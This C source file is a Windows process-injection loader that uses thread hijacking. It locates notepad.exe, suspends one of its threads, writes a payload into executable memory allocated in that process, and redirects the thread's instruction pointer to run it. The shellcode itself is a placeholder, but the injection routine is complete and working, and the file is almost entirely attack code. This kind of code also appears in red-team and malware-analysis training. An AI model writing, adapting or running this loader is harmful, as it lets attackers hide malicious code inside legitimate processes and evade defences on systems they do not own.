#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

unsigned char payload[] = "SHELLCODE GOES HERE";
unsigned int payload_len = sizeof(payload);

int FindTarget(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
	
        //Take a snapshot of all processes in the system.        
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
	
        // Set the size of the structure before using it        
        pe32.dwSize = sizeof(PROCESSENTRY32);
	
        // Retrieve information about the first process,
  	// and exit if unsuccessful        
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
        
	// Loops through the process list and looks for maching string.
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
        
	//Returns the pid of target process.
        return pid;
}


HANDLE FindThread(int pid){

	HANDLE hThread = NULL;
	THREADENTRY32 thEntry;
	
	//Snapshot the threads of target process
	thEntry.dwSize = sizeof(thEntry);
    	HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	
	//Finds the first thread in the target process and uses it for injection.
	while (Thread32Next(Snap, &thEntry)) {
		if (thEntry.th32OwnerProcessID == pid) 	{
			hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID);
			break;
		}
	}
	CloseHandle(Snap);
	
	//Returns the handle to the thread.
	return hThread;
}



// set remote process/thread context
int InjectCTX(int pid, HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

	HANDLE hThread = NULL;
	LPVOID pRemoteCode = NULL;
	CONTEXT ctx;

	// find a thread in target process
	hThread = FindThread(pid);
	if (hThread == NULL) {
		printf("Error, hijack unsuccessful.\n");
		return -1;
	}
	SuspendThread(hThread);
	
	// perform payload injection
	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);

	// execute the payload
	ctx.ContextFlags = CONTEXT_FULL;
	GetThreadContext(hThread, &ctx);
#ifdef _M_IX86 
	ctx.Eip = (DWORD_PTR) pRemoteCode; //x86
#else
	ctx.Rip = (DWORD_PTR) pRemoteCode; //x64
#endif
	SetThreadContext(hThread, &ctx);
	
	return ResumeThread(hThread);	
}


int main(void) {
    
	int pid = 0;
    HANDLE hProc = NULL;

	pid = FindTarget("notepad.exe");

	if (pid) {
		printf("Notepad.exe PID = %d\n", pid);

		// try to open target process
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			InjectCTX(pid, hProc, payload, payload_len);
			CloseHandle(hProc);
		}
	}
	return 0;
}
